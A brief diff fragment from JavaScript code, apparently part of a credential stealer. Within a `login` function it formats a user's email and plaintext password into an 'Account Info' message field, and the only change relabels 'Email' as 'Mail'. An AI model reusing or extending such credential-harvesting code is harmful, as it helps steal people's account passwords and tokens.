@@ -661,7 +661,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            value: `Mail: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
